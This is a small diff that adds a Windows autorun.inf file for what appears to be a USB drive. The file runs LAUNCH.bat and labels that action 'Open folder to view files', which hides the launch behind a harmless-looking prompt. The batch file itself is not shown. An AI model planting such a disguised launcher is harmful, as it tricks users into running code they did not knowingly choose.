@@ -1,0 +1,5 @@
+[autorun]
+open=LAUNCH.bat
+action=Open folder to view files
+icon=usb.ico
+label=Data
